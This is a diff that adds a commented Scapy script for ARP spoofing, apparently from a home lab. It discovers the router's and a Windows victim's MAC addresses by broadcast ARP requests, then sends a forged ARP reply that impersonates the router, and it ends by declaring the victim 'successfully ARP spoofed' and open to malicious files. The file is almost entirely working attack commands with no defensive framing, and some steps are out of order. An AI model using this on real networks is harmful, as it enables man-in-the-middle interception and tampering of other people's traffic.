@@ -1,0 +1,59 @@
+#creating malicious arp packets using scapy in python
+
+
+#super user
+scapy
+#scapy console
+
+ls(ARP)
+#lists the arp packet parameters
+
+broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
+#makes a broadcast packet for searching a macaddress 
+
+arppacket = ARP(pdst="192.168.32.1")
+#sets the ip of the router in the arppacket can be obtained from cmd of windows by command: arp -a
+
+arppacket.show()
+#shows the arppacket parameters value
+
+finalpacket = broadcast/arppacket
+#combines the two packets into final packet
+
+finalpacket.show()
+#shows the finalpacket parameters
+
+answer
+#prints the type of answer in the packet
+
+answer = srp(finalpacket, timeout=2, verbose=True)[0]
+#sends the finalpacket and shows it
+
+mac_address = answer[0][1].hwsrc
+#stores the value of recieved macaddress in vaiable
+
+mac_address
+#prints the macaddress
+
+
+
+finalpacket.pdst = "192.168.43.97"
+#changing the macaddress of vm to windows for sending malicious file
+
+answer = srp(finalpacket, timeout=2, verbose= False)[0]  
+#sends the finalpacket to gather macaddress
+answer
+#address of the packets
+
+mac = answer[0][1].hwsrc
+#stores the macadress
+print(mac)
+#prints mac address
+
+packet = ARP(op=2, hwsrc="<mac address of the windows machine>", pdst="<ip address of windows machine>", psrc="<ip address of the router>")
+#sending the packet to windows pc thinking we are the router
+send(packet, verbose=False)
+#send the packet
+
+#AFTER THIS ON CHECKING WITH CMD PROMPT ON WINDOWS WE CAN SEE THAT THE MACADDRESS OF OUR VIRTUALBOX CHANGED TO ROUTER SO THAT WE CAN SEND ANY PACKET TO THE WINDOWS
+#SUCCESFULLY ARP SPOOFED WINDOWS PC 
